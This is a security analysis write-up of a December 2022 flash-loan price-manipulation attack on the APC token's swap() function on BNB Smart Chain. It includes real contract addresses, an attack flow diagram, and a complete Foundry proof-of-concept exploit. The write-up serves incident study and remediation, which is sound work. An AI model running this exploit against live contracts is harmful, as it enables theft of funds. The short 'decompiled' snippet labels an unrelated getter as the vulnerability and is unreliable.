# APC — swap() AMM Price Manipulation Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-12 |
| **Protocol** | APC Token |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | Unconfirmed |
| **APC Token** | [0x2AA504586d6CaB3C59Fa629f74c586d78b93A025](https://bscscan.com/address/0x2AA504586d6CaB3C59Fa629f74c586d78b93A025) |
| **MUSD Token** | [0x473C33C55bE10bB53D81fe45173fcc444143a13e](https://bscscan.com/address/0x473C33C55bE10bB53D81fe45173fcc444143a13e) |
| **USDT** | [0x55d398326f99059fF775485246999027B3197955](https://bscscan.com/address/0x55d398326f99059fF775485246999027B3197955) |
| **Vulnerable Contract (TransparentUpgradeableProxy)** | [0x5a88114F02bfFb04a9A13a776f592547B3080237](https://bscscan.com/address/0x5a88114F02bfFb04a9A13a776f592547B3080237) |
| **PancakeSwap Router** | [0x10ED43C718714eb63d5aA57B78B54704E256024E](https://bscscan.com/address/0x10ED43C718714eb63d5aA57B78B54704E256024E) |
| **DODO Flash Loan** | [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681](https://bscscan.com/address/0xFeAFe253802b77456B4627F8c2306a9CeBb5d681) |
| **Root Cause** | The APC→MUSD conversion rate in `swap()` directly depends on the AMM spot price from `apcUsdtPair.getReserves()`, allowing unlimited MUSD minting via reserve manipulation within the same block (no TWAP/Chainlink oracle used) |
| **CWE** | CWE-840: Business Logic Error |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/APC_exp.sol) |

---
## 1. Vulnerability Overview

The APC protocol's `TransparentUpgradeableProxy` contained a `swap()` function that handled APC↔MUSD conversions. This function calculated the APC/MUSD exchange rate based on the current spot price from the PancakeSwap AMM. The attacker flash-borrowed 500,000 USDT from DODO, artificially pumped the APC price by performing a large USDT→APC swap, then called `swap(APC → MUSD)` at the manipulated price to receive an excessive amount of MUSD. The attacker subsequently realized the excess MUSD by dumping APC→USDT and repaid the flash loan.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable swap() - directly references AMM spot price
contract APCProxy { // TransparentUpgradeableProxy
    IPancakePair public apcUsdtPair;

    // ❌ Spot price-based exchange exposed to flash loan price manipulation
    function swap(address tokenIn, address tokenOut, uint256 amountIn)
        external returns (uint256 amountOut)
    {
        // ❌ Price calculated from current AMM reserves → manipulable
        (uint112 reserve0, uint112 reserve1,) = apcUsdtPair.getReserves();
        uint256 price = uint256(reserve1) * 1e18 / uint256(reserve0);

        // ❌ MUSD amount determined based on manipulated price
        amountOut = amountIn * price / 1e18;
        IMUSD(tokenOut).mint(msg.sender, amountOut);
    }
}

// ✅ Correct pattern - use TWAP or Chainlink oracle
contract SafeAPCProxy {
    AggregatorV3Interface public priceOracle;
    uint256 public constant TWAP_PERIOD = 30 minutes;

    function swap(address tokenIn, address tokenOut, uint256 amountIn)
        external returns (uint256 amountOut)
    {
        // ✅ Use manipulation-resistant TWAP price
        uint256 twapPrice = _getTWAPPrice(TWAP_PERIOD);
        amountOut = amountIn * twapPrice / 1e18;

        // ✅ Slippage protection
        require(amountOut >= minAmountOut, "Slippage too high");
        IMUSD(tokenOut).mint(msg.sender, amountOut);
    }
}
```

---
### On-Chain Original Code

Source: Bytecode decompiled


**APC_decompiled.sol** — Entry point:
```solidity
// ❌ Root cause: The APC→MUSD conversion rate in `swap()` directly depends on `apcUsdtPair.getReserves()` AMM spot price, allowing unlimited MUSD
    function swapStartTime() external view returns (uint256) {}  // 0xbacf251b  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Flash loan 500,000 USDT from DODO
    │
    ├─[2] Large USDT → APC swap (PancakeSwap)
    │       APC price artificially pumped
    │       reserve(USDT) increases, reserve(APC) decreases
    │
    ├─[3] Call swap(APC, MUSD, 100,000 APC)
    │       ❌ Receives excess MUSD based on manipulated APC spot price
    │       Acquires MUSD in excess of actual value
    │
    ├─[4] Large APC → USDT swap (PancakeSwap)
    │       APC price dumped
    │
    ├─[5] MUSD → APC swap (at normal price)
    │       Repurchases APC with MUSD at normal price
    │
    ├─[6] APC → USDT resale
    │
    ├─[7] Repay DODO flash loan (500,000 USDT)
    │
    └─[8] Net profit: USDT arbitrage
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IAPC {
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IMUSD {
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface IAPCProxy {
    function swap(address tokenIn, address tokenOut, uint256 amount) external;
}

interface IDODO {
    function flashLoan(uint256, uint256, address, bytes calldata) external;
}

interface IRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256, uint256, address[] calldata, address, uint256
    ) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract APCExploit is Test {
    IAPC     apc     = IAPC(0x2AA504586d6CaB3C59Fa629f74c586d78b93A025);
    IMUSD    musd    = IMUSD(0x473C33C55bE10bB53D81fe45173fcc444143a13e);
    IERC20   USDT    = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IAPCProxy proxy  = IAPCProxy(0x5a88114F02bfFb04a9A13a776f592547B3080237);
    IRouter  router  = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IDODO    dodo    = IDODO(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);

    function setUp() public {
        vm.createSelectFork("bsc");
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] USDT", USDT.balanceOf(address(this)), 18);
        dodo.flashLoan(500_000 * 1e18, 0, address(this), "");
        emit log_named_decimal_uint("[End] USDT", USDT.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address, uint256 amount, uint256, bytes calldata) external {
        // [Step 2] Large USDT → APC swap (price pumping)
        USDT.approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(USDT); path[1] = address(apc);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), block.timestamp
        );

        // [Step 3] APC → MUSD swap (receive excess MUSD at manipulated price)
        // ⚡ Excess MUSD issued based on pumped APC price
        uint256 apcBal = apc.balanceOf(address(this));
        apc.approve(address(proxy), type(uint256).max);
        proxy.swap(address(apc), address(musd), apcBal / 2);

        // [Step 4] APC → USDT dump
        path[0] = address(apc); path[1] = address(USDT);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            apc.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );

        // [Step 5] MUSD → APC (at normal price)
        musd.approve(address(proxy), type(uint256).max);
        proxy.swap(address(musd), address(apc), musd.balanceOf(address(this)));

        // [Step 6] APC → USDT resale
        path[0] = address(apc); path[1] = address(USDT);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            apc.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );

        // Repay flash loan
        USDT.transfer(address(dodo), amount);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | AMM spot price-based swap() price manipulation |
| **CWE** | CWE-840: Business Logic Error |
| **OWASP DeFi** | Price Oracle Manipulation |
| **Attack Vector** | Flash loan → USDT→APC pump → `swap(APC→MUSD)` excess receipt → APC dump → reverse swap |
| **Preconditions** | `swap()` function directly references AMM spot price, exchange rate calculated from manipulated reserves |
| **Impact** | USDT arbitrage profit (magnitude unconfirmed) |

---
## 6. Remediation Recommendations

1. **Use TWAP Oracle**: Apply Uniswap V2/V3 TWAP (Time-Weighted Average Price) for price calculations within `swap()` to prevent single-block price manipulation.
2. **Chainlink External Oracle**: Reference externally validated price feeds (Chainlink, Band Protocol) to eliminate the impact of on-chain AMM price manipulation.
3. **Slippage Limits**: Allow users to specify a minimum received amount (`minAmountOut`) when calling `swap()`, and reject exchanges that exceed the allowed deviation.
4. **Reentrancy Prevention and Callback Restrictions**: Add defensive logic to detect the pattern of same-block price manipulation combined with `swap()` calls.

---
## 7. Lessons Learned

- **Price Reference Risk in Upgradeable Proxies**: Even when using the TransparentUpgradeableProxy pattern, if the internal logic depends on AMM spot prices, the same vulnerability exists. Upgradeability does not resolve price manipulation vulnerabilities.
- **Structural Vulnerability in APC/MUSD Design**: A protocol's internal `swap()` function that converts one token to another must not directly reference external AMM prices. It should use an internal pricing model or only allow manipulation-resistant oracles.
- **500K USDT Flash Loan Is Sufficient**: Even a relatively small flash loan can manipulate AMM spot prices sufficiently. The lower the liquidity of a pair, the less capital is required to carry out the attack.